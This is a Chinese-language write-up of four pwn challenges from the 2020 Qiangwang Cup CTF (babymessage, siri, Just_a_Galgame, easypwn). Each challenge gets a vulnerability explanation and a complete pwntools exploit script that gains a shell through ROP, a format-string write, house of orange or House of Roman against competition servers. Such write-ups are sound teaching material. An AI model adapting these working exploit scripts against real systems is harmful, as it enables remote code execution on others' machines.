# 强网杯部分pwn题writeup

阅读量 **200250**

|评论 **10**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-01 17:00:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0134b62a0746f060c9.jpg)

## 0x01 babymessage

###  0x01 考点

栈溢出，RBP覆盖

通过改变rbp 来改变上级程序的局部变量

###  0x02 漏洞点

    
    
    __int64 __fastcall leave_message(unsigned int a1)
    {
      int v1; // ST14_4
      __int64 v3; // [rsp+18h] [rbp-8h]
      puts("message: ");
      v1 = read(0, &v3, a1);  //这里a1可控，当a1值够大时，就发生栈溢出
      strncpy(buf, (const char *)&v3, v1);
      buf[v1] = 0;
      puts("done!\n");
    }
    

###  0x03 利用思路

  1. 初始状态时，v1=16，只能覆盖到RBP
  2. 覆盖RBP到可控区域，从而回到主程序main后会影响局部变量。
  3. 从而控制v1使其变得很大，然后再来完成栈溢出，完成ROP操作。

###  0x04 坑点

  1. 测试过程中发现回到`elf.symbols["main"]`会出错，也没去查为什么，直接通过栈迁移，在一次溢出中完成泄露地址及利用。
  2. system函数执行`/bin/sh`有问题，最后换成`execve`函数

###  0x05 payload

    
    
    from pwn import *
    
    context.log_level = "debug"
    context.arch = "amd64"
    FILENAME = "./babymessage"
    
    #io = process(FILENAME)
    io = remote("123.56.170.202", 21342)
    elf = ELF(FILENAME)
    #libc = elf.libc
    libc = ELF("./libc-2.27.so")
    
    def leave_name(name):
        io.sendlineafter("choice: \n","1")
        io.sendafter("name: \n",name)
    
    def leave_message(message):
        io.sendlineafter("choice: \n","2")
        io.sendlineafter("message: \n",message)
    
    def show_message():
        io.sendlineafter("choice: \n","3")
    
    def exit_game():
        io.sendlineafter("choice: \n","4")
    
    leave_name("\x00\x80")
    name_addr = 0x06010D0
    payload = flat([
        "b"*8,
        name_addr+0x5
    ])
    leave_message(payload)
    show_message()
    #0x0000000000400ac3 : pop rdi ; ret
    #0x0000000000400ac1 : pop rsi ; pop r15 ; ret
    #0x0000000000400886 : leave ; ret
    pop_rsi_r15_ret = 0x0000000000400ac1
    pop_rdi_ret = 0x0000000000400ac3
    leave_ret = 0x0000000000400886
    payload2 = flat([
         "b"*8,
        elf.bss(0),
        pop_rdi_ret,
        elf.got["puts"],
        elf.plt["puts"],
        pop_rdi_ret,
        0,
        pop_rsi_r15_ret,
        elf.bss(0),0,
        elf.plt["read"],
        leave_ret    
    ])
    print(pidof(io))
    pause()
    leave_message(payload2)
    io.recvuntil("done!\n\n")
    puts_addr = u64(io.recvuntil("\n",drop=True).ljust(8,b"\x00"))
    log.info("[*]puts_addr: "+hex(puts_addr))
    libc_base = puts_addr - libc.symbols["puts"]
    log.info("[*]libc_base: "+hex(libc_base))
    system_addr = libc_base + libc.symbols["system"]
    binsh_addr  = elf.bss(0x0)
    execve_addr = libc_base + libc.symbols["execve"]
    log.info("[*]system_addr: "+hex(system_addr))
    log.info("[*]binsh_addr: "+hex(binsh_addr))
    payload = flat([
        "/bin/sh\x00",
        pop_rdi_ret,
        binsh_addr,
        pop_rsi_r15_ret,
        0,0,
        execve_addr
    ])
    io.sendline(payload)
    io.interactive()
    

## 0x02 siri

###  1.考点

FMT

###  2.漏洞点

    
    
    signed __int64 __fastcall sub_1212(const char *a1)
    {
      char *v2; // [rsp+18h] [rbp-128h]
      char s; // [rsp+20h] [rbp-120h]
      unsigned __int64 v4; // [rsp+138h] [rbp-8h]
    
      v4 = __readfsqword(0x28u);
      v2 = strstr(a1, "Remind me to ");
      if ( !v2 )
        return 0LL;
      memset(&s, 0, 0x110uLL);
      sprintf(&s, ">>> OK, I'll remind you to %s", v2 + 13);
      printf(&s);  //FMT
      puts(&::s);
      return 1LL;
    }
    

###  3\. 利用思路

  1. 程序保护全开，先利用栈上的返回地址及RBP地址，泄露栈地址及程序基址
  2. 利用FMT泄露，got表地址，获得libc
  3. 利用FMT覆盖返回地址为one_gadget
  4. 这里改写地址时，会先sprintf将不可见字符去掉，但是我们输入到字符串a1，在栈上，这时候只需要调整FMT的offset即可。

###  4.payload

    
    
    from pwn import *
    
    context.log_level = "info"
    context.arch = "amd64"
    FILENAME = "./Siri"
    
    #io = process(FILENAME)
    io = remote("123.56.170.202", 12124)
    elf = ELF(FILENAME)
    libc = elf.libc
    
    
    def leak_addr(addr):
        io.sendlineafter(">>> ","Hey Siri!")
        payload = flat([
            "Remind me to ",
            "a"*5,
            "%{offset}$s".format(offset = 0x9 + 6).rjust(8,"b"),
            addr
        ])
        io.sendlineafter(">>> ",payload)
        io.recvuntil("OK, I'll remind you to aaaaabbb")
        addr = u64(io.recvuntil("\x7f").ljust(8,b"\x00"))
        log.info("[+]leak_addr: "+hex(addr))
        return addr
    
    def set_addr(addr,value):
        io.sendlineafter(">>> ","Hey Siri!")
        payload = b"Remind me to " + b"aaa" + fmtstr_payload(0x35 + 6 - 9,{addr: value},numbwritten = 16 + 14)
        print(payload)
        io.sendlineafter(">>> ",payload)
    
    def leak():
        io.sendlineafter(">>> ","Hey Siri!")
        payload = flat([
            "Remind me to ",
            "a"*5,
            "%{offset}$p".format(offset = 0x29 + 6)
        ])
        io.sendlineafter(">>> ",payload)
        io.recvuntil("OK, I'll remind you to aaaaa")
        ret_addr = int(io.recvuntil("\n",drop=True),16)
        log.info("[+]ret_addr: "+hex(ret_addr))
        prom_base = ret_addr - 0x144c
        log.info("[+]prom_base: "+hex(prom_base))
        io.sendlineafter(">>> ","Hey Siri!")
        payload = flat([
            "Remind me to ",
            "a"*5,
            "%{offset}$p".format(offset = 0x28 + 6)
        ])
        io.sendlineafter(">>> ",payload)
        io.recvuntil("OK, I'll remind you to aaaaa")
        rbp_addr = int(io.recvuntil("\n",drop=True),16)
        log.info("[+]rbp_addr: "+hex(rbp_addr))
        return prom_base,rbp_addr,ret_addr
    
    prom_base,rbp_addr,ret_addr = leak()
    libc_addr = leak_addr(prom_base + elf.got["puts"]) - 0x80a30
    log.info("[+]libc_addr: "+hex(libc_addr))
    one = [0x4f365,0x4f3c2,0x10a45c]
    one_addr = libc_addr + one[0]
    log.info("[+]one_addr: "+hex(one_addr))
    print(pidof(io))
    pause()
    set_addr(rbp_addr - 0x118 ,one_addr)
    io.interactive()
    

## 0x03 Just_a_Galgame

###  0x01 考点

house of orange

###  0x02 漏洞点

  1. 数组越界
  2. 刚好覆盖下一个堆的size字段。

###  0x03 利用思路

  1. 程序没有free，这就利用`house of orange`
  2. 程序设计的就刚好可以利用`house of orange`构造出`unsorted_bin`,泄露出`libc`
  3. 再利用程序设计的，bye的功能及数组越界，完成任意地址写，改写`_malloc_hook`为`one_gadget`

###  0x04 payload

    
    
    from pwn import *
    
    context.log_level = "info"
    context.arch = "amd64"
    FILENAME = "./Just_a_Galgame"
    
    #io = process(FILENAME)
    io = remote("123.56.170.202",52114)
    elf = ELF(FILENAME)
    #libc = elf.libc
    libc = ELF("./libc-2.27.so")
    
    def gift():
        io.sendlineafter(">> ","1")
    
    def movie(index,name):
        io.sendlineafter(">> ","2")
        io.sendlineafter("idx >> ",str(index))
        io.sendafter("movie name >> ",name)
    
    def confess():
        io.sendlineafter(">> ","3")
    
    def collection():
        io.sendlineafter(">> ","4")
    
    def leave(message):
        io.sendlineafter(">> ","5")
        io.sendafter("Hotaru: Won't you stay with me for a while? QAQ\n\n",message)
    
    gift()
    movie(0,p64(0x0) + p64(0xd41))
    print(pidof(io))
    confess()
    gift()
    gift()
    collection()
    io.recvuntil("2: ")
    main_arean = u64(io.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 96
    log.info("[+]main_arean: " + hex(main_arean))
    libc_base = main_arean - 0x3ebc40
    log.info("[+]libc_base: " + hex(libc_base))
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    one = [0x4f365,0x4f3c2,0x10a45c]
    one_addr = libc_base + one[1]
    leave(p64(malloc_hook - 0x60))
    movie(8,p64(one_addr)+p64(one_addr))
    gift()
    io.interactive()
    

## 0x04 easypwn

###  0x01 考点

  1. `off by one`
  2. `unsorted_bin attack`
  3. `fastbin_attack`
  4. `House of Roman`
  5. 改写`__IO_2_1_stdout_`完成任意地址读，泄露libc

###  0x02 漏洞点

    
    
       if ( a2 - 1 == v5 )
        {
          buf = 0;
          *(a1 + ++i) = 0;  //这里会多输入一个\x00
          return __readfsqword(0x28u) ^ v6;
        }
    

###  0x03 坑点

  1. 程序没有show功能，需要改写IO
  2. 程序开始时，调用了`mallopt`,使得`global_max_fast = 0x10`，相当于禁用了fastbin。

    
    
     if ( !mallopt(1, 0) )
        exit(-1);
    

###  0x04 利用思路

**0x01 step1**

利用`off by one`的漏洞，完成两个指针，指向同一块`trunk`，要利用2次，获取两个这样到trunk。简单的讲下利用过程

    
    
        add(0x88) #1
        add(0x68) #2
        add(0xf8) #3  //先申请上述三个trunk
        free(1)
        edit(2,"a"*0x60+p64(0x100))  //修改了prev_trunk_size = 0x100 = size1 + siz2,利用off by one，修改了prev_inuse = 0
        free(3) //这时候会触发unlink，系统会认定，1-3trunk都是空闲的，都回收到unsorted_bin
        add(0x88) #1
        add(0x68) #3  //取到的3号trunk就会与2号trunk重叠，获取到，完成两个指针，指向同一块trunk
    

**0x02 step2**

利用`unsorted_bin attack`覆盖掉bk的值，使其成为`target_addr -0x10`,完成攻击后，会使`target_addr`变得很大，利用这个攻击，去修改`global_max_fast`的值，为下面利用fastbin攻击创造条件。  
 **[注：这里利用main_arena+88的高地址，爆破出global_max_fast的地址，概率为1/16]**

**0x03 step3**

利用`House of
Roman`的想法，先构造一个fastbin链，再修改链上的值，使其指向其他bin。这里注意，尽量将修改前的bins和修改后的bins只做到最后一位不一样，这样可以减少爆破的概率。
**[注： 之前未对这个做处理，发现爆破成功的概率为1/(16*16*16),处理后成功到概率为1/(16*16)]**

**0x04 step4**

构造好fastbin链后，利用之前的`main_arena+88`的高地址，爆破得到`_IO_2_1_stdout_-0x43`的地址，构造一个0x70大小的fastbins。

**0x05 step5**

通过修改获得的fastbins，来修改`_IO_2_1_stdout_`的值，使其为`"\x00"*0x33+p64(0xfbad3887)+p64(0)*3+"\x40"`这里我们修改了，`_IO_write_base`,使其不等于`_IO_write_ptr`，这样`_IO_write_base`和`_IO_write_ptr`之间的数据就会被泄露出来。

**0x06 step6**

获取到libc地址，那么接下来就简单了，再利用一次`House of
Roman`的攻击方法，或者利用`double_free`,将`__malloc_hook_`改写为`one_gadget`，就完成了利用。

###  0x05 payload

    
    
    from pwn import *
    context.log_level = "info"
    FILENAME = "./easypwn"
    
    #io = process(FILENAME)
    #elf = ELF(FILENAME)
    #libc = elf.libc
    libc = ELF("./libc-easypwn.so")
    
    def add(size):
        io.sendlineafter("Your choice:\n","1")
        io.sendlineafter("size:\n",str(size))
    
    def edit(index,content):
        io.sendlineafter("Your choice:\n","2")
        io.sendlineafter("idx:\n",str(index))
        io.sendafter("content:\n",content)
    
    def free(index):
        io.sendlineafter("Your choice:\n","3")
        io.sendlineafter("idx:\n",str(index))
    
    def pwn():
        # 2 = 3
        add(0x68) #0
        add(0x88) #1
        add(0x68) #2
        add(0xf8) #3
        add(0x68) #4
        add(0x68) #5
        add(0x88) #6
        add(0x68) #7  
        add(0xf8) #8
        add(0x68) #9
        add(0x68) #10
        free(1)
        edit(2,"a"*0x60+p64(0x100))
        free(3)
        add(0x88) #1
        add(0x68) #3
        add(0x68) #11
        add(0x88) #12
        # 8= 7 
        free(6)
        edit(7,"a"*0x60+p64(0x100))
        free(8)
        add(0x88) #6
        add(0x68) #8
        add(0xf8) #13
        # fastbin_max = 0x7f
        free(5)
        free(3)
        edit(2,p64(0)+"\xe8\x37"+"\n")
        add(0x68) #3
        add(0x68) #5 5=2
        free(3)
        log.info("[+]good_job_1!")
        free(11)
        free(7)
        log.info("[+]good_job_2!")
        edit(8,"\x00" + "\n")
        edit(2,"\xdd\x25" + "\n")
        log.info("[+]good_job_3!")
        add(0x68) #3
        add(0x68) #7
        add(0x68) #11
        edit(11,"\x00"*0x33+p64(0xfbad3887)+p64(0)*3+"\x40"+"\n")
        libc_addr = u64(io.recvuntil("\x7f").ljust(8,"\x00")) - 0x3c5640
        log.info("[+]libc_addr: "+hex(libc_addr))
        #one = [0x45216,0x4526a,0xf02a4,0xf1147] #local
        one = [0x45226,0x4527a,0xf0364,0xf1207] #remote
        one_addr = libc_addr + one[2]
        malloc_addr = libc_addr + libc.symbols["__malloc_hook"]
        free(2)
        free(10)
        free(5)
        add(0x68) #2
        edit(2,p64(malloc_addr-0x23)+"\n")
        add(0x68) #5
        add(0x68) #10
        add(0x68) #14
        edit(14,"\x00"*3+p64(0)+p64(one_addr)*2+"\n")
        add(0x28)
        io.interactive()
    
    for i in range(70):
        try:
            #io = process(FILENAME)
            #io = process(FILENAME,env={"LD_PRELOAD":"./libc-easypwn.so"})
            io = remote("39.101.184.181",10000)
            pwn()
        except:
            pass
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **jackey** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/215274](/post/id/215274)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __9赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eqJu5R0YOGlpvwBV4iaqSEJ5icHFAeK1T5bK5eYEB4Bv7x0enic9KyqMojnhTZK75Tf7uSLVx2iaWLoYw/132)
jackey

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

